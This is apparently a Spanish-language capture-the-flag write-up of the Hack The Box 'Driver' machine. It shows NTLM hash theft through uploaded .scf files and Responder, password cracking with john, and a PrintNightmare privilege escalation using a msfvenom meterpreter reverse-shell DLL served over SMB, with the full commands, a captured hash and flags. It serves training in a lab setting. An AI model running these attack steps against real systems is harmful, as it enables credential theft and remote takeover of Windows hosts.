---
tags:
title: Driver - Easy (HTB)
permalink: /Driver-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sS --open -n -Pn --min-rate 5000 -p- 10.129.95.238 -vv -oG nmap_scan
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-26 23:16 -0500
Initiating SYN Stealth Scan at 23:16
Scanning 10.129.95.238 [65535 ports]
Discovered open port 445/tcp on 10.129.95.238
Discovered open port 135/tcp on 10.129.95.238
Discovered open port 80/tcp on 10.129.95.238
Discovered open port 5985/tcp on 10.129.95.238
Completed SYN Stealth Scan at 23:17, 27.22s elapsed (65535 total ports)
Nmap scan report for 10.129.95.238
Host is up, received user-set (0.37s latency).
Scanned at 2025-12-26 23:16:56 EST for 27s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 127
135/tcp  open  msrpc        syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.28 seconds
           Raw packets sent: 131081 (5.768MB) | Rcvd: 25 (1.352KB)
```

## Website / Port 80

La pagina principal no muestra nada de nada.

![image-center](/assets/images/Pasted image 20251227011803.png)
### NTLM hash Steal

Sin embargo en la seccio[[]]n de `Firmware Updates`, veo un mensaje el cual me indica que puedo subir un modelo, y que el equipo detrás de la pagina lo va a estar revisando cada x tiempo.

![image-center](/assets/images/Pasted image 20251227012044.png)
## Shell as tony
### SFC file

Por lo que se me ocurrió usar la herramienta `ntml_theft` para poder crear archivos los cuales yo pueda subir y así cuando el usuario que corra la pagina lo abra, pueda robar su hash `NTLM`, comúnmente se usa los archivos `.scf` para que la maquina victima al ejecutar el archivo, dispare una solicitud vía `smb`, desde yo voy a estar montando mi servidor con `Responder`.

```bash
python3 ntlm_theft.py --generate all --server 10.10.17.19 --filename evil
/home/zs1n/Desktop/htb/driver/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: evil/evil.scf (BROWSE TO FOLDER)
Created: evil/evil-(url).url (BROWSE TO FOLDER)
Created: evil/evil-(icon).url (BROWSE TO FOLDER)
Created: evil/evil.lnk (BROWSE TO FOLDER)
Created: evil/evil.rtf (OPEN)
Created: evil/evil-(stylesheet).xml (OPEN)
Created: evil/evil-(fulldocx).xml (OPEN)
Created: evil/evil.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: evil/evil-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: evil/evil-(includepicture).docx (OPEN)
Created: evil/evil-(remotetemplate).docx (OPEN)
Created: evil/evil-(frameset).docx (OPEN)
Created: evil/evil-(externalcell).xlsx (OPEN)
Created: evil/evil.wax (OPEN)
Created: evil/evil.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: evil/evil.asx (OPEN)
Created: evil/evil.jnlp (OPEN)
Created: evil/evil.application (DOWNLOAD AND OPEN)
Created: evil/evil.pdf (OPEN AND ALLOW)
Created: evil/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: evil/evil.library-ms (BROWSE TO FOLDER)
Created: evil/Autorun.inf (BROWSE TO FOLDER)
Created: evil/desktop.ini (BROWSE TO FOLDER)
Created: evil/evil.theme (THEME TO INSTALL
Generation Complete.
```

Después de generar los archivos, corrí mi responder, y subí el archivo, haciendo que unos segundos después pueda interceptar el hash `NTLMv2` del usuario `tony`.

```bash
responder -I tun0
<SNIP>
[SMB] NTLMv2-SSP Client   : 10.129.95.238
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:e1a6dff234976dd0:E2D2D29397751D7C145968678E06CD61:01010000000000008044B03DC176DC01EF0C0D3D3FC61CCA000000000200080043005A005100460001001E00570049004E002D005700310058004A004F00380037004A0058004E00320004003400570049004E002D005700310058004A004F00380037004A0058004E0032002E0043005A00510046002E004C004F00430041004C000300140043005A00510046002E004C004F00430041004C000500140043005A00510046002E004C004F00430041004C00070008008044B03DC176DC0106000400020000000800300030000000000000000000000000200000A64B6517C298738B5ED74E05E527DF47E5D3F5AAAC5762F9767215147B28D44B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E0031003900000000000000000000000000   
```
### Crack password

Voy a usar `john` para romper el hash.

```bash
john hash -w=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)     
1g 0:00:00:00 DONE (2025-12-26 23:43) 100.0g/s 3276Kp/s 3276Kc/s 3276KC/s 280690..eatme1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Y voy a usar `eivl-winrm` para realizar la conexion.

```powershell
root@kali$ evil-winrm -i 10.10.11.106 -u tony -p liltony

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents>
```

```powershell
*Evil-WinRM* PS C:\Users\tony\Desktop> cat user.txt
D2F44B35************************
```
## Shell as nt authority\system
### History file

Viendo el histórico del usuario `tony` veo que se parece que corrió un comando el cual agrego la impresora `(Printer)` `RICOH_PLC6` con una versión especifica.

```powershell
*Evil-WinRM* PS C:\Users\tony\appdata\Roaming\Microsoft\Windows\PowerShell\PSReadline> cat ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1
```

Buscando por `exploit` para dicha versión y dicha impresora, encontré este [enlace](https://www.exploit-db.com/exploits/48036) el cual se puede hacer con `metasploit`, en mi caso no me funciono, así que busque por vulnerabilidades asociadas a impresoras donde di con el famoso `PrintNightmare` donde en este [repositorio](https://github.com/nathanealm/PrintNightmare-Exploit), muestra la explicación de como se da la explotación y con el paso a paso para llegar a conseguir una shell `privilegiada`.

### Configure msfvenom

Configuro el `listener`.

```bash
msf exploit(windows/local/ricoh_driver_privesc) > use multi/handler
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost tun0
lhost => tun0
msf exploit(multi/handler) > set LPORT 9000
LPORT => 9000
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.17.19:9000 
```
### Generate payload

Después tengo que crear una `dll` maliciosa con `msfvenom`.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.19 LPORT=9000 -f dll -o Print_Mal.dll        
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: Print_Mal.dll
```

Ahora monto un servidor `smb` con `impacket`.

```bash
impacket-smbserver -smb2support share $(pwd)
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

Y ya después puedo correr el script, indicándole la ruta en la cual voy a estar sirviendo la `dll`.

```bash
python3 CVE-2021-1675.py driver.htb/tony:liltony@10.129.95.238 '\\10.10.17.19\share\Print_Mal.dll'                     
[*] Connecting to ncacn_np:10.129.95.238[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.10.17.19\share\Print_Mal.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
```
## Shell

Y exitosamente veo que recibo la conexión como el usuario `NT AUTHORITY\SYSTEM` de la maquina.

```bash
msf exploit(multi/handler) > 
[*] Sending stage (230982 bytes) to 10.129.95.238
[*] Meterpreter session 2 opened (10.10.17.19:9000 -> 10.129.95.238:49430) at 2025-12-27 00:51:33 -0500
sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  DRIVER\tony @ DRIVER          10.10.17.19:4444 -> 10.129.95.238:49427 (10.129.95.238)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DRIVER  10.10.17.19:9000 -> 10.129.95.238:49430 (10.129.95.238)

msf exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```powershell
meterpreter > shell
Process 4596 created.
Channel 1 created.
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ca3fc0d75e94a111da278f7b05b11e69
```

`~Happy Hacking.`



